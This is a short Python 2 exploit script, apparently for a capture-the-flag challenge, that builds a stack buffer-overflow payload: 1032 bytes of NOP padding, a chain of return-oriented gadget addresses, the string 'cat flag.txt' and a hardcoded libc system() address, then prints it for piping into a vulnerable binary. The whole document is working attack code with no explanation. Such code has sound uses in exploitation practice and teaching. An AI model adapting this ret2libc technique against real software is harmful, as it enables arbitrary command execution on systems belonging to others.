import struct

padding_len = 1032


system_addr = 0x7ffff7a53390

nop = '\x90' * (padding_len)

payload =  nop + struct.pack('<Q', 0x4006d1) + struct.pack('<Q', 0x18) + struct.pack('<Q', 0x4006d3)
 
payload = payload + 'cat flag.txt' + '\x00' * 12 + struct.pack('<Q', 0x4006d0) + struct.pack('<Q', system_addr) 

print payload
